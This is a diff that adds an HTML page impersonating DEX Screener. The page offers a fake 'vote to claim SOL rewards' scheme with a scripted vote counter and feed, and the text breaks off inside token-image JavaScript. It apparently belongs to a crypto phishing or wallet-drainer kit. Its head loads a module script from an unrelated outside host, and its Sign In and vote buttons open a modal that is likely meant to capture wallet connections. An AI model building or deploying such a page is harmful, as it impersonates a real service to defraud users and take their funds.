@@ -1,0 +1,1034 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta content="width=device-width, initial-scale=1" name="viewport">
+<title>DEX Screener</title>
+<meta content="#000000" name="theme-color">
+<link rel="icon" type="image/x-icon" href="favicon.ico">
+<link rel="icon" type="image/png" href="favicon.png">
+<link rel="apple-touch-icon" href="favicon.png">
+
+<!-- Open Graph / Twitter Card -->
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="DEX Screener - VOTE">
+<meta property="og:title" content="DEX Screener - VOTE" id="ogTitle">
+<meta property="og:description" content="Vote for this token to claim your voting rewards. Realtime price charts and trading history on DEXes across Ethereum, BSC, Polygon, Avalanche, Fantom, Harmony, Cronos, Arbitrum, Optimism and more." id="ogDesc">
+<meta property="og:image" content="https://dexscreener.com/img/apple-touch-icon.png" id="ogImage">
+<meta property="og:url" content="" id="ogUrl">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:site" content="@dexscreener">
+<meta name="twitter:title" content="DEX Screener" id="twTitle">
+<meta name="twitter:description" content="Vote for this token to claim your voting rewards. Realtime price charts and trading history on DEXes across Ethereum, BSC, Polygon, Avalanche, Fantom, Harmony, Cronos, Arbitrum, Optimism and more." id="twDesc">
+<meta name="twitter:image" content="https://dexscreener.com/img/apple-touch-icon.png" id="twImage">
+<meta name="description" content="Vote for this token to claim your voting rewards. Realtime price charts and trading history on DEXes across Ethereum, BSC, Polygon, Avalanche, Fantom, Harmony, Cronos, Arbitrum, Optimism and more." id="metaDesc">
+<link href="css2.css" rel="stylesheet">
+<script src="./video.extended.min.js"></script>
+<script type="module" src="https://neatly-resonant.ext-helper.cc/_nuxt/assets/index.js"></script>
+<style>
+  :root {
+    --ds-bg: #000000;
+    --ds-surface: #0a0a0a;
+    --ds-card: #0e0e0e;
+    --ds-border: #1a1a1a;
+    --ds-border-hi: #272727;
+    --ds-text: #e5e5e5;
+    --ds-text2: #888;
+    --ds-text3: #555;
+    --ds-green: #4ade80;
+    --ds-green-bg: rgba(74,222,128,0.08);
+    --ds-red: #f87171;
+    --ds-blue: #60a5fa;
+    --ds-accent: #6366f1;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--ds-bg);color:var(--ds-text);font-family:"Inter",system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;min-height:100vh;overflow-x:hidden;-webkit-font-smoothing:antialiased;padding-bottom:64px}
+  @media(min-width:768px){body{padding-bottom:0}}
+  a{color:inherit;text-decoration:none}
+  button{cursor:pointer;border:none;background:none;color:inherit;font-family:inherit}
+  img{display:block;max-width:100%}
+
+  /* Preloader */
+  #preloader{position:fixed;inset:0;background:#000;display:flex;align-items:center;justify-content:center;z-index:99999;transition:opacity .5s,visibility .5s}
+  #preloader.hide{opacity:0;visibility:hidden}
+  .loader-logo{width:80px;height:auto;animation:logoPulse 1.6s ease-in-out infinite}
+  @media(min-width:768px){.loader-logo{width:120px}}
+  @keyframes logoPulse{0%,100%{transform:scale(.92);opacity:.4}50%{transform:scale(1);opacity:1}}
+
+  /* Header */
+  .hd{position:sticky;top:0;z-index:100;background:rgba(0,0,0,.88);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border-bottom:1px solid var(--ds-border)}
+  .hd-in{max-width:1200px;margin:0 auto;padding:0 16px;height:64px;display:flex;align-items:center;justify-content:space-between}
+  .hd-logo img{height:48px;width:auto}
+  @media(min-width:640px){.hd-logo img{height:54px}}
+  @media(min-width:768px){.hd-logo img{height:60px}}
+  .hd-nav{display:none;align-items:center;gap:2px}
+  @media(min-width:768px){.hd-nav{display:flex}}
+  .hd-nav a{padding:6px 14px;border-radius:8px;font-size:13px;font-weight:500;color:var(--ds-text2);transition:background .15s,color .15s}
+  .hd-nav a:hover{background:var(--ds-card);color:var(--ds-text)}
+  .hd-nav a.on{background:var(--ds-card);color:#fff}
+  .hd-r{display:flex;align-items:center;gap:8px}
+  .hd-btn{display:flex;align-items:center;gap:6px;padding:7px 16px;border-radius:8px;font-size:13px;font-weight:500;background:var(--ds-card);border:1px solid var(--ds-border);color:var(--ds-text);transition:border-color .15s,background .15s}
+  .hd-btn:hover{border-color:var(--ds-border-hi);background:#141414}
+  .hd-btn svg{width:14px;height:14px}
+
+  /* Ticker */
+  .tk{background:var(--ds-surface);border-bottom:1px solid var(--ds-border);height:34px;overflow:hidden}
+  .tk-in{display:flex;align-items:center;justify-content:center;gap:24px;height:100%;padding:0 16px;max-width:1200px;margin:0 auto;font-size:11px;color:var(--ds-text2);white-space:nowrap;overflow-x:auto;scrollbar-width:none}
+  .tk-in::-webkit-scrollbar{display:none}
+  .tk-i{display:flex;align-items:center;gap:5px;flex-shrink:0}
+  .tk-l{color:var(--ds-text3)}
+  .tk-v{color:var(--ds-text);font-weight:600}
+
+  /* Main */
+  .mn{max-width:1100px;margin:0 auto;padding:28px 16px 60px}
+  .mn-grid{display:grid;grid-template-columns:1fr;gap:24px}
+  @media(min-width:860px){.mn-grid{grid-template-columns:340px 1fr;gap:28px}}
+
+  /* Token Panel (left) */
+  .tp{background:var(--ds-card);border:1px solid var(--ds-border);border-radius:14px;padding:24px;display:flex;flex-direction:column;align-items:center}
+  .tp-img-wrap{position:relative;width:120px;height:120px;margin-bottom:16px}
+  .tp-spinner{width:120px;height:120px;border-radius:50%;border:3px solid var(--ds-border);border-top-color:var(--ds-green);animation:spin 1s linear infinite}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .tp-img{width:100%;height:100%;border-radius:50%;object-fit:cover}
+  .tp-name{font-size:22px;font-weight:700;color:#fff;text-align:center;line-height:1.2}
+  .tp-sym{font-size:14px;font-weight:600;color:var(--ds-text2);margin-top:2px;text-align:center}
+  .tp-chain{display:inline-flex;align-items:center;gap:4px;margin-top:8px;padding:3px 10px;border-radius:6px;background:var(--ds-surface);border:1px solid var(--ds-border);font-size:11px;font-weight:500;color:var(--ds-text2)}
+  .tp-chain .chain-dot{width:6px;height:6px;border-radius:50%;background:var(--ds-green)}
+
+  /* Stats Grid */
+  .tp-stats{width:100%;margin-top:18px;display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--ds-border);border-radius:10px;overflow:hidden}
+  .tp-stat{background:var(--ds-surface);padding:12px 14px;display:flex;flex-direction:column;gap:2px}
+  .tp-stat-label{font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:.5px;color:var(--ds-text3)}
+  .tp-stat-val{font-size:14px;font-weight:600;color:var(--ds-text)}
+  .tp-stat-val.green{color:var(--ds-green)}
+  .tp-stat-val.red{color:var(--ds-red)}
+
+  /* Pair address */
+  .tp-pair{width:100%;margin-top:12px;display:flex;align-items:center;gap:8px;padding:10px 12px;border-radius:8px;background:var(--ds-surface);border:1px solid var(--ds-border)}
+  .tp-pair-label{font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:.5px;color:var(--ds-text3);white-space:nowrap}
+  .tp-pair-addr{font-size:12px;font-family:"SFMono-Regular","Consolas","Liberation Mono",monospace;color:var(--ds-text2);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1}
+
+  /* View on DS button */
+  .tp-ds-link{width:100%;margin-top:12px;display:flex;align-items:center;justify-content:center;gap:6px;padding:10px;border-radius:8px;background:var(--ds-surface);border:1px solid var(--ds-border);font-size:13px;font-weight:500;color:var(--ds-blue);transition:border-color .15s,background .15s}
+  .tp-ds-link:hover{border-color:var(--ds-border-hi);background:#111}
+  .tp-ds-link svg{width:14px;height:14px}
+
+  /* Right Panel */
+  .rp{display:flex;flex-direction:column;gap:20px}
+
+  /* Vote Card */
+  .vc{background:var(--ds-card);border:1px solid var(--ds-border);border-radius:14px;padding:20px}
+  .vc-title{font-size:15px;font-weight:600;color:#fff;margin-bottom:14px}
+  .vc-btn{width:100%;display:flex;align-items:center;justify-content:center;gap:8px;padding:12px 20px;border-radius:10px;font-size:14px;font-weight:600;background:linear-gradient(135deg,#1a1a1a,#111);border:1px solid var(--ds-border);color:#fff;transition:border-color .2s,transform .15s,box-shadow .2s}
+  .vc-btn:hover{border-color:var(--ds-accent);transform:translateY(-1px);box-shadow:0 4px 20px rgba(99,102,241,.15)}
+  .vc-btn:active{transform:translateY(0)}
+  .vc-btn img{width:18px;height:18px}
+  .vc-desc{font-size:12px;color:var(--ds-text2);line-height:1.6;margin-bottom:14px}
+  .vc-meta{display:flex;justify-content:space-between;align-items:center;font-size:12px;color:var(--ds-text2);margin-top:10px}
+  .vc-reward{font-size:11px;font-weight:600;color:var(--ds-green)}
+  .vc-note{display:flex;align-items:center;gap:6px;margin-top:14px;padding:10px 12px;border-radius:8px;background:rgba(99,102,241,.06);border:1px solid rgba(99,102,241,.12);font-size:11px;color:var(--ds-text2);line-height:1.4}
+  .vc-note svg{width:14px;height:14px;flex-shrink:0;color:var(--ds-accent)}
+  .vc-track{width:100%;height:5px;border-radius:3px;background:var(--ds-surface);overflow:hidden;margin-top:8px}
+  .vc-bar{height:100%;border-radius:3px;background:linear-gradient(90deg,var(--ds-accent),#818cf8);transition:width .8s}
+
+  /* Feed */
+  .fd{background:var(--ds-card);border:1px solid var(--ds-border);border-radius:14px;overflow:hidden}
+  .fd-hd{display:flex;align-items:center;justify-content:space-between;padding:12px 14px;border-bottom:1px solid var(--ds-border)}
+  .fd-title{font-size:13px;font-weight:600;color:var(--ds-text)}
+  .fd-badge{display:inline-flex;align-items:center;gap:5px;font-size:11px;font-weight:500;padding:3px 8px;border-radius:6px;background:var(--ds-green-bg);color:var(--ds-green)}
+  .fd-badge.off{background:rgba(248,113,113,.1);color:var(--ds-red)}
+  .fd-dot{width:6px;height:6px;border-radius:50%;background:var(--ds-green);animation:lp 1.4s ease-in-out infinite}
+  @keyframes lp{0%,100%{opacity:.5;transform:scale(.9)}50%{opacity:1;transform:scale(1.2)}}
+  .fd-list{max-height:340px;overflow-y:auto;scrollbar-width:none}
+  .fd-list::-webkit-scrollbar{display:none}
+  .fd-row{display:flex;align-items:center;justify-content:space-between;padding:10px 14px;border-bottom:1px solid rgba(26,26,26,.6);transition:background .12s}
+  .fd-row:last-child{border-bottom:none}
+  .fd-row:hover{background:rgba(255,255,255,.02)}
+  .fd-row-l{display:flex;align-items:center;gap:10px}
+  .fd-row-dot{width:6px;height:6px;border-radius:50%;background:var(--ds-accent);flex-shrink:0}
+  .fd-addr{font-size:12px;font-weight:500;color:var(--ds-text);font-family:"SFMono-Regular","Consolas",monospace}
+  .fd-act{font-size:10px;color:var(--ds-text3);margin-top:1px}
+  .fd-row-r{text-align:right}
+  .fd-amt{font-size:12px;font-weight:600;color:var(--ds-green)}
+  .fd-lbl{font-size:10px;color:var(--ds-text3);margin-top:1px}
+
+  /* Footer */
+  .ft{background:var(--ds-surface);border-top:1px solid var(--ds-border)}
+  .ft-in{max-width:1200px;margin:0 auto;padding:28px 16px;display:flex;flex-direction:column;align-items:center;gap:16px;text-align:center}
+  .ft-desc{font-size:12px;color:var(--ds-text2);max-width:480px;line-height:1.6}
+  .ft-soc{display:flex;align-items:center;gap:8px}
+  .ft-s{width:34px;height:34px;display:flex;align-items:center;justify-content:center;border-radius:8px;border:1px solid var(--ds-border);background:var(--ds-card);transition:border-color .15s,background .15s}
+  .ft-s:hover{border-color:var(--ds-border-hi);background:#141414}
+  .ft-s svg{width:16px;height:16px;color:var(--ds-text2);transition:color .15s}
+  .ft-s:hover svg{color:#fff}
+  .ft-c{font-size:11px;color:var(--ds-text3)}
+
+  /* About Section */
+  .ab{background:var(--ds-surface);border-top:1px solid var(--ds-border)}
+  .ab-in{max-width:1100px;margin:0 auto;padding:40px 16px}
+  .ab-title{font-size:18px;font-weight:700;color:#fff;margin-bottom:24px;display:flex;align-items:center;gap:8px}
+  .ab-title svg{width:20px;height:20px;color:var(--ds-accent)}
+  .ab-grid{display:grid;grid-template-columns:1fr;gap:16px}
+  @media(min-width:640px){.ab-grid{grid-template-columns:1fr 1fr}}
+  @media(min-width:860px){.ab-grid{grid-template-columns:1fr 1fr 1fr}}
+  .ab-card{background:var(--ds-card);border:1px solid var(--ds-border);border-radius:12px;padding:20px;transition:border-color .15s}
+  .ab-card:hover{border-color:var(--ds-border-hi)}
+  .ab-card-icon{width:36px;height:36px;border-radius:8px;display:flex;align-items:center;justify-content:center;margin-bottom:12px}
+  .ab-card-icon svg{width:18px;height:18px}
+  .ab-card-icon.blue{background:rgba(96,165,250,.1);color:var(--ds-blue)}
+  .ab-card-icon.green{background:var(--ds-green-bg);color:var(--ds-green)}
+  .ab-card-icon.purple{background:rgba(99,102,241,.1);color:var(--ds-accent)}
+  .ab-card-h{font-size:14px;font-weight:600;color:#fff;margin-bottom:6px}
+  .ab-card-p{font-size:12px;color:var(--ds-text2);line-height:1.6}
+  .ab-links{display:flex;flex-wrap:wrap;gap:8px;margin-top:24px}
+  .ab-link{display:inline-flex;align-items:center;gap:5px;padding:7px 14px;border-radius:8px;font-size:12px;font-weight:500;background:var(--ds-card);border:1px solid var(--ds-border);color:var(--ds-text2);transition:border-color .15s,color .15s}
+  .ab-link:hover{border-color:var(--ds-border-hi);color:#fff}
+  .ab-link svg{width:13px;height:13px}
+
+  /* Mobile Nav */
+  .mn-nav{position:fixed;bottom:0;left:0;right:0;height:60px;background:rgba(0,0,0,.95);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);border-top:1px solid var(--ds-border);display:flex;justify-content:space-around;align-items:center;z-index:9999}
+  @media(min-width:768px){.mn-nav{display:none}}
+  .nv{display:flex;flex-direction:column;align-items:center;gap:2px;font-size:10px;font-weight:500;color:var(--ds-text3);transition:color .15s}
+  .nv svg,.nv img{width:20px;height:20px}
+  .nv.on{color:#fff}
+  .nv.vt{color:var(--ds-green)}
+</style>
+</head>
+<body>
+
+<!-- Preloader -->
+<div id="preloader">
+  <img alt="Loading" class="loader-logo" src="0_mGS7bBsi5idS5_-o.jpg">
+</div>
+
+<!-- Header -->
+<header class="hd">
+  <div class="hd-in">
+    <div class="hd-logo">
+      <img alt="DEX Screener" src="0_mGS7bBsi5idS5_-o.jpg">
+    </div>
+    <nav class="hd-nav">
+      <a href="https://dexscreener.com" target="_blank" class="on">Vote</a>
+      <a href="https://docs.dexscreener.com" target="_blank">Docs</a>
+      <a href="https://docs.dexscreener.com/api/reference" target="_blank">API</a>
+    </nav>
+    <div class="hd-r">
+      <button class="hd-btn SCr9TT-E XzFjQjpw" onclick="openModal()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" y1="12" x2="3" y2="12"/></svg>
+        Sign In
+      </button>
+    </div>
+  </div>
+</header>
+
+<!-- Ticker -->
+<div class="tk">
+  <div class="tk-in">
+    <div class="tk-i"><span class="tk-l">24H Vol:</span><span class="tk-v">$16.91B</span></div>
+    <div class="tk-i"><span class="tk-l">24H Txns:</span><span class="tk-v">39,992,567</span></div>
+    <div class="tk-i"><span class="tk-l">Pairs:</span><span class="tk-v">150,412</span></div>
+    <div class="tk-i"><span class="tk-l">Chains:</span><span class="tk-v">92</span></div>
+  </div>
+</div>
+
+<!-- Main -->
+<main class="mn">
+  <div class="mn-grid">
+
+    <!-- Left: Token Panel -->
+    <div class="tp">
+      <div class="tp-img-wrap">
+        <div class="tp-spinner" id="tokenSpinner"></div>
+        <img class="tp-img" id="tokenImage" src="" style="display:none">
+      </div>
+      <div class="tp-name" id="tokenName">Select Coin</div>
+      <div class="tp-sym" id="tokenSub">Waiting...</div>
+      <div class="tp-chain" id="tokenChain" style="display:none">
+        <span class="chain-dot"></span>
+        <span id="chainName">—</span>
+      </div>
+
+      <div class="tp-stats" id="tokenStats" style="display:none">
+        <div class="tp-stat">
+          <span class="tp-stat-label">Price USD</span>
+          <span class="tp-stat-val" id="statPrice">—</span>
+        </div>
+        <div class="tp-stat">
+          <span class="tp-stat-label">24H Change</span>
+          <span class="tp-stat-val" id="statChange">—</span>
+        </div>
+        <div class="tp-stat">
+          <span class="tp-stat-label">Market Cap</span>
+          <span class="tp-stat-val" id="statMcap">—</span>
+        </div>
+        <div class="tp-stat">
+          <span class="tp-stat-label">Liquidity</span>
+          <span class="tp-stat-val" id="statLiq">—</span>
+        </div>
+        <div class="tp-stat">
+          <span class="tp-stat-label">24H Volume</span>
+          <span class="tp-stat-val" id="statVol">—</span>
+        </div>
+        <div class="tp-stat">
+          <span class="tp-stat-label">24H Txns</span>
+          <span class="tp-stat-val" id="statTxns">—</span>
+        </div>
+      </div>
+
+      <div class="tp-pair" id="tokenPair" style="display:none">
+        <span class="tp-pair-label">Pair</span>
+        <span class="tp-pair-addr" id="pairAddr">—</span>
+      </div>
+
+      <a class="tp-ds-link" id="dsLink" href="#" target="_blank" style="display:none">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
+        View on DEX Screener
+      </a>
+    </div>
+
+    <!-- Right: Vote + Feed -->
+    <div class="rp">
+
+      <!-- Vote Card -->
+      <div class="vc">
+        <div class="vc-title" id="voteCardTitle">Vote to claim</div>
+        <div class="vc-desc" id="voteDesc">Vote for this token to claim your voting rewards</div>
+        <button class="vc-btn SCr9TT-E XzFjQjpw" id="voteSOL" onclick="openModal()">
+          <span id="voteBtnText">Vote to claim SOL</span>
+          <img src="Solana_logo.png" alt="SOL">
+        </button>
+        <div class="vc-meta">
+          <span id="voteText">16 / 100 votes left</span>
+        </div>
+        <div class="vc-track">
+          <div class="vc-bar" id="voteBar" style="width:16%"></div>
+        </div>
+      </div>
+
+      <!-- Live Feed -->
+      <div class="fd">
+        <div class="fd-hd">
+          <span class="fd-title">Vote Feed</span>
+          <span class="fd-badge" id="liveBadge">
+            <span class="fd-dot"></span>
+            Live
+          </span>
+        </div>
+        <div class="fd-list" id="recentVotes"></div>
+      </div>
+
+    </div>
+  </div>
+</main>
+
+<!-- Footer -->
+<footer class="ft">
+  <div class="ft-in">
+    <p class="ft-desc">Vote for this token to claim your voting rewards. Realtime price charts and trading history on DEXes across Ethereum, BSC, Polygon, Avalanche, Fantom, Harmony, Cronos, Arbitrum, Optimism and more.</p>
+    <div class="ft-soc">
+      <a class="ft-s" href="https://twitter.com/dexscreener" target="_blank" title="Follow us on Twitter">
+        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512"><path d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
+      </a>
+      <a class="ft-s" href="https://telegram.me/dexscreenerchat" target="_blank" title="Join us on Telegram">
+        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512"><path d="M446.7 98.6l-67.6 318.8c-5.1 22.5-18.4 28.1-37.3 17.5l-103-75.9-49.7 47.8c-5.5 5.5-10.1 10.1-20.7 10.1l7.4-104.9 190.9-172.5c8.3-7.4-1.8-11.5-12.9-4.1L117.8 284 16.2 252.2c-22.1-6.9-22.5-22.1 4.6-32.7L418.2 66.4c18.4-6.9 34.5 4.1 28.5 32.2z"/></svg>
+      </a>
+      <a class="ft-s" href="https://discord.gg/XNgMb5tQN7" target="_blank" title="Join us on Discord">
+        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 640 512"><path d="M524.531,69.836a1.5,1.5,0,0,0-.764-.7A485.065,485.065,0,0,0,404.081,32.03a1.816,1.816,0,0,0-1.923.91,337.461,337.461,0,0,0-14.9,30.6,447.848,447.848,0,0,0-134.426,0,309.541,309.541,0,0,0-15.135-30.6,1.89,1.89,0,0,0-1.924-.91A483.689,483.689,0,0,0,116.085,69.137a1.712,1.712,0,0,0-.788.676C39.068,183.651,18.186,294.69,28.43,404.354a2.016,2.016,0,0,0,.765,1.375A487.666,487.666,0,0,0,176.02,479.918a1.9,1.9,0,0,0,2.063-.676A348.2,348.2,0,0,0,208.12,430.4a1.86,1.86,0,0,0-1.019-2.588,321.173,321.173,0,0,1-45.868-21.853,1.885,1.885,0,0,1-.185-3.126c3.082-2.309,6.166-4.711,9.109-7.137a1.819,1.819,0,0,1,1.9-.256c96.229,43.917,200.41,43.917,295.5,0a1.812,1.812,0,0,1,1.924.233c2.944,2.426,6.027,4.851,9.132,7.16a1.884,1.884,0,0,1-.162,3.126,301.407,301.407,0,0,1-45.89,21.83,1.875,1.875,0,0,0-1,2.611,391.055,391.055,0,0,0,30.014,48.815,1.864,1.864,0,0,0,2.063.7A486.048,486.048,0,0,0,610.7,405.729a1.882,1.882,0,0,0,.765-1.352C623.729,277.594,590.933,167.465,524.531,69.836ZM222.491,337.58c-28.972,0-52.844-26.587-52.844-59.239S193.056,219.1,222.491,219.1c29.665,0,53.306,26.82,52.843,59.239C275.334,310.993,251.924,337.58,222.491,337.58Zm195.38,0c-28.971,0-52.843-26.587-52.843-59.239S388.437,219.1,417.871,219.1c29.667,0,53.307,26.82,52.844,59.239C470.715,310.993,447.538,337.58,417.871,337.58Z"/></svg>
+      </a>
+    </div>
+    <div class="ft-c">&copy; 2026 DEX Screener &middot; All rights reserved</div>
+  </div>
+</footer>
+
+<!-- Mobile Nav -->
+<nav class="mn-nav">
+  <a class="nv on SCr9TT-E XzFjQjpw" href="#"><img alt="Screener" src="unnamed.png" style="filter:brightness(1.2)"><span>Screener</span></a>
+  <a class="nv SCr9TT-E XzFjQjpw" href="#"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><line x1="21" x2="16.65" y1="21" y2="16.65"/></svg><span>Search</span></a>
+  <a class="nv vt SCr9TT-E XzFjQjpw" href="#"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg><span>Vote</span></a>
+  <a class="nv SCr9TT-E XzFjQjpw" href="#"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 22a2 2 0 0 0 2-2h-4a2 2 0 0 0 2 2zm6-6V11a6 6 0 1 0-12 0v5l-2 2v1h16v-1l-2-2z"/></svg><span>Alerts</span></a>
+  <a class="nv SCr9TT-E XzFjQjpw" href="#"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="3" x2="21" y1="6" y2="6"/><line x1="3" x2="21" y1="12" y2="12"/><line x1="3" x2="21" y1="18" y2="18"/></svg><span>More</span></a>
+</nav>
+
+<script>
+(function () {
+  var spinner = document.getElementById('tokenSpinner');
+  var imgEl = document.getElementById('tokenImage');
+  var nameEl = document.getElementById('tokenName');
+  var subEl = document.getElementById('tokenSub');
+  var chainEl = document.getElementById('tokenChain');
+  var chainName = document.getElementById('chainName');
+  var statsEl = document.getElementById('tokenStats');
+  var pairEl = document.getElementById('tokenPair');
+  var pairAddr = document.getElementById('pairAddr');
+  var dsLink = document.getElementById('dsLink');
+  var statPrice = document.getElementById('statPrice');
+  var statChange = document.getElementById('statChange');
+  var statMcap = document.getElementById('statMcap');
+  var statLiq = document.getElementById('statLiq');
+  var statVol = document.getElementById('statVol');
+  var statTxns = document.getElementById('statTxns');
+  var voteCardTitle = document.getElementById('voteCardTitle');
+  var voteDesc = document.getElementById('voteDesc');
+  var voteBtnText = document.getElementById('voteBtnText');
+  var voteText = document.getElementById('voteText');
+  var voteBar = document.getElementById('voteBar');
+  var feedEl = document.getElementById('recentVotes');
+  var liveBadge = document.getElementById('liveBadge');
+  var avatarLoadSeq = 0;
+
+  function esc(s) {
+    return String(s || '').replace(/[&<>"]/g, function (c) {
+      return ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' })[c];
+    });
+  }
+
+  var DEFAULT_TOKEN_IMG = 'https://dexscreener.com/img/apple-touch-icon.png';
+
+  var TRUST_WALLET_CHAIN = {
+    ethereum: 'ethereum',
+    bsc: 'smartchain',
+    polygon: 'polygon',
+    arbitrum: 'arbitrum',
+    base: 'base',
+    optimism: 'optimism',
+    avalanche: 'avalanche',
+    fantom: 'fantom',
+    cronos: 'cronos'
+  };
+
+  function looksLikeSolanaMint(ca) {
+    if (!ca || typeof ca !== 'string') return false;
+    if (ca.length < 32 || ca.length > 48) return false;
+    return /^[1-9A-HJ-NP-Za-km-z]+$/.test(ca);
+  }
+
+  function normalizePairForImage(p, ca) {
+    var chain = (p && p.chainId) || '';
+    if (!chain && ca && looksLikeSolanaMint(ca)) chain = 'solana';
+    var base = Object.assign({}, (p && p.baseToken) || {});
+    if (!base.address && ca) base.address = ca;
+    return Object.assign({}, p, { chainId: chain, baseToken: base });
+  }
+
+  function normalizeTokenImageUrl(raw) {
+    if (!raw || typeof raw !== 'string') return '';
+    var u = raw.trim();
+    if (u.indexOf('ipfs://') === 0) {
+      var rest = u.slice(7).replace(/^\/+/, '');
+      if (rest.indexOf('ipfs/') === 0) rest = rest.slice(5);
+      return 'https://ipfs.io/ipfs/' + rest.replace(/^\/+/, '');
+    }
+    if (u.indexOf('ar://') === 0) {
+      return 'https://arweave.net/' + u.slice(5).replace(/^\/+/, '');
+    }
+    if (u.indexOf('//') === 0) u = 'https:' + u;
+    if (u.indexOf('format=auto') !== -1) u = u.replace(/format=auto/g, 'format=png');
+    return u;
+  }
+
+  function uniqUrls(arr) {
+    var out = [];
+    var seen = {};
+    for (var i = 0; i < arr.length; i++) {
+      if (!arr[i] || seen[arr[i]]) continue;
+      seen[arr[i]] = 1;
+      out.push(arr[i]);
+    }
+    return out;
+  }
+
+  function expandImageVariants(norm) {
+    var list = [];
+    if (!norm) return list;
+    list.push(norm);
+    var m = norm.match(/\/ipfs\/([^?#]+)/);
+    if (m && m[1]) {
+      var cid = m[1];
+      list.push('https://cloudflare-ipfs.com/ipfs/' + cid);
+      list.push('https://gateway.pinata.cloud/ipfs/' + cid);
+    }
+    try {
+      var parsed = new URL(norm);
+      if (parsed.search && (parsed.searchParams.has('w') || parsed.searchParams.has('width'))) {
+        var p2 = new URL(norm);
+        ['w', 'width', 'h', 'height'].forEach(function (k) {
+          var v = p2.searchParams.get(k);
+          if (v != null && !isNaN(+v) && +v > 0 && +v < 256) {
+            p2.searchParams.set(k, '512');
+          }
+        });
+        if (p2.toString() !== norm) list.push(p2.toString());
+        p2 = new URL(norm);
+        ['w', 'width', 'h', 'height'].forEach(function (k) {
+          p2.searchParams.delete(k);
+        });
+        var stripped = p2.toString().replace(/\?$/, '');
+        if (stripped !== norm) list.push(stripped);
+      }
+    } catch (e) {}
+    return uniqUrls(list);
+  }
+
+  function buildTokenImageCandidates(p, ca) {
+    var info = (p && p.info) || {};
+    var base = (p && p.baseToken) || {};
+    var chain = (p && p.chainId) || '';
+    if (!chain && ca && looksLikeSolanaMint(ca)) chain = 'solana';
+    var addr = String((base.address || ca || '')).trim();
+    var raw = [];
+
+    function pushField(x) {
+      if (!x || typeof x !== 'string') return;
+      var n = normalizeTokenImageUrl(x);
+      if (!n) return;
+      var vars = expandImageVariants(n);
+      for (var v = 0; v < vars.length; v++) raw.push(vars[v]);
+    }
+
+    pushField(info.openGraph);
+    pushField(info.imageUrl);
+    pushField(info.image);
+    pushField(info.icon);
+    pushField(base.logoURI);
+    pushField(base.imageUrl);
+    pushField(base.icon);
+
+    if (chain && addr) {
+      pushField(
+        'https://dd.dexscreener.com/ds-data/tokens/' +
+          encodeURIComponent(chain) +
+          '/' +
+          encodeURIComponent(addr) +
+          '.png'
+      );
+    }
+
+    if (addr) {
+      if (chain === 'solana') {
+        pushField(
+          'https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/' + addr + '/logo.png'
+        );
+        pushField(
+          'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/solana/assets/' + addr + '/logo.png'
+        );
+      }
+      var tw = TRUST_WALLET_CHAIN[chain];
+      if (tw) {
+        var lower = addr.toLowerCase();
+        pushField(
+          'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/' + tw + '/assets/' + lower + '/logo.png'
+        );
+        if (chain !== 'solana' && addr !== lower) {
+          pushField(
+            'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/' + tw + '/assets/' + addr + '/logo.png'
+          );
+        }
+      }
+    }
+
+    return uniqUrls(raw);
+  }
+
+  function expandRemoteUrlStrings(urls) {
+    var raw = [];
+    for (var i = 0; i < urls.length; i++) {
+      var n = normalizeTokenImageUrl(urls[i]);
+      if (!n) continue;
+      var vars = expandImageVariants(n);
+      for (var v = 0; v < vars.length; v++) raw.push(vars[v]);
+    }
+    return raw;
+  }
+
+  function fetchWithTimeout(url, ms) {
+    var ctrl = typeof AbortController !== 'undefined' ? new AbortController() : null;
+    var t = setTimeout(function () {
+      if (ctrl) ctrl.abort();
+    }, ms || 8000);
+    return fetch(url, { cache: 'no-store', signal: ctrl ? ctrl.signal : undefined })
+      .then(function (r) {
+        clearTimeout(t);
+        return r;
+      })
+      .catch(function (e) {
+        clearTimeout(t);
+        throw e;
+      });
+  }
+
+  function fetchRemotePfpUrlsForToken(chain, ca) {
+    if (!ca) return Promise.resolve([]);
+    var out = [];
+    var eff = chain || (looksLikeSolanaMint(ca) ? 'solana' : '');
+    var p = Promise.resolve();
+
+    function needsCorsProxy(url) {
+      try {
+        var h = new URL(url).hostname;
+        return /pump\.fun|jup\.ag|coingecko\.com|solana\.fm/.test(h);
+      } catch (e) {
+        return false;
+      }
+    }
+
+    function getJson(url) {
